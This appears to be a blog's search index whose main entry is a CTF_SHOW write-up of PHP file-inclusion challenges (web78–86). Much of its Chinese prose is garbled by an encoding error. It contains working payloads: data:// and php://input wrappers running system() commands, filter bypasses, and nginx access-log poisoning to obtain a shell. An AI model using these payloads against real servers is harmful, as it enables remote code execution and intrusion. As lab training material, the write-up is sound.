<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>å¼€å§‹</title>
    <url>/2022/02/26/article-title/</url>
    <content><![CDATA[<p>ç»å†äº†ä¸¤å¤©çš„æ­å»ºï¼Œä¸æ–­çš„æ‘¸ç´¢å’Œç™¾åº¦è°·æ­Œæœç´¢ï¼Œè‡ªå·±çš„åšå®¢ä¹Ÿæ€»ç®—æ˜¯æ­å»ºæˆåŠŸäº†ï¼Œè™½ç„¶è¿˜å¾ˆèœï¼Œä½†ä¹Ÿæ€»ç®—æ˜¯è·¨å‡ºäº†ç¬¬ä¸€æ­¥ã€‚</p>
]]></content>
      <categories>
        <category>æ­å»º</category>
      </categories>
      <tags>
        <tag>è¿è¡Œä¸­</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF_SHOWä¹‹webå…¥é—¨éƒ¨åˆ†wp</title>
    <url>/2022/02/26/jian-web1/</url>
    <content><![CDATA[<h4 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æŸ¥çœ‹ç›®å½•</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'glob:///*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>å‘ç° include åŒ…å«å‡½æ•°ï¼Œé€‰æ‹©ä½¿ç”¨ data ä¼ªåè®® data://text/plain,æ„é€  payloadï¼š?file=data://text/plain,<?php phpinfo();?>æˆåŠŸå‡ºç° phpinfo()é¡µé¢</p>
<p><img src="D:\study\program\blog\source\images\web_78a.png"></p>
<p>ç„¶åè¾“å¦‚æŸ¥è¯¢ç›®å½•çš„æŒ‡ä»¤ï¼Œå‘ç°æœ‰ flag.php æ–‡ä»¶ï¼š?file=data://text/plain,<?php system("ls");?></p>
<p><img src="D:\study\program\blog\source\images\web_78b.png"></p>
<p>ä½¿ç”¨ tac å‘½ä»¤è¯»å–æ–‡ä»¶ï¼ŒæˆåŠŸè¯»å– flag:ctfshow{7bc171e1-06c8-4e6c-8e13-33585ea3d0be}</p>
<h4 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?php
if(isset($_GET[&#39;file&#39;]))&#123;
    $file &#x3D; $_GET[&#39;file&#39;];
    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);
    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);
    include($file);
&#125;else&#123;
    highlight_file(__FILE__);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å‘ç°è¿™æ¬¡å¯¹ php è¿›è¡Œäº†è¿‡æ»¤ï¼Œä½†å¯ä»¥ä½¿ç”¨ php çŸ­æ ‡è®°<?=?>å’Œ?å ä½ç¬¦è¿›è¡Œè¯»å‡º</p>
<pre class="line-numbers language-none"><code class="language-none">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?&#x3D;system(&quot;tac flag.???&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æˆåŠŸè¯»å‡º flagï¼šctfshow{e8c8a34c-8e08-4b8e-92ac-6387a53ddb92}</p>
<h4 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?php
if(isset($_GET[&#39;file&#39;]))&#123;
    $file &#x3D; $_GET[&#39;file&#39;];
    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);
    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);
    include($file);
&#125;else&#123;
    highlight_file(__FILE__);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™æ¬¡å‘ç°è¿˜å¯¹ data è¿›è¡Œäº†æ›¿æ¢ï¼ŒåŸæœ¬æƒ³æƒ³ä½¿ç”¨çš„æ˜¯ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">?file&#x3D;Php:&#x2F;&#x2F;input
post: &lt;?php system(&quot;ls&quot;)?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ä½†ä¸çŸ¥ä¸ºä»€ä¹ˆæ²¡æœ‰æ˜¾ç¤ºå‡ºæ¥ï¼Œæ‰€ä»¥æŸ¥çœ‹äº† hintï¼Œç»™çš„æç¤ºæ˜¯è®¿é—® nginx å’Œ apache ä¸‹çš„æ—¥å¿—æ–‡ä»¶ï¼Œgetshell çš„æ–¹æ³•ï¼Œpayload å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;489ea2b8-3fb5-4cc6-b9d6-7fc5608c320b.challenge.ctf.show&#x2F;?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ä½¿ç”¨ bp æŠ“åŒ…ï¼Œå°†ğŸå†™å†UAå¤´é‡Œ</p>
<p><img src="D:\study\program\blog\source\images\web_80a.png"></p>
<p><img src="D:\study\program\blog\source\images\web_80b.png"></p>
<p><img src="D:\study\program\blog\source\images\web_80c.png"></p>
<h4 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?php
if(isset($_GET[&#39;file&#39;]))&#123;
    $file &#x3D; $_GET[&#39;file&#39;];
    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);
    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);
    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);
    include($file);
&#125;else&#123;
    highlight_file(__FILE__);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å‘ç°è¿™æ¬¡è¿˜å°†å†’å·ç»™è¿‡æ»¤äº†ï¼Œä¸è¿‡å´å¯ä»¥ç»§ç»­è®¿é—® var/log/nginx/access.log æ—¥å¿—æ–‡ä»¶è¿›è¡Œä¼ ğŸ,å¾—åˆ°flag</p>
<p><img src="D:\study\program\blog\source\images\web_81.png"></p>
<h4 id="web82-86"><a href="#web82-86" class="headerlink" title="web82-86"></a>web82-86</h4><p>æ¡ä»¶ç«äº‰ï¼Œé™åˆ¶äº†å¹¶å‘ï¼Œå…ˆåšåé¢çš„ã€‚</p>
]]></content>
      <categories>
        <category>ctf_show</category>
      </categories>
      <tags>
        <tag>æ–‡ä»¶åŒ…å«</tag>
      </tags>
  </entry>
</search>
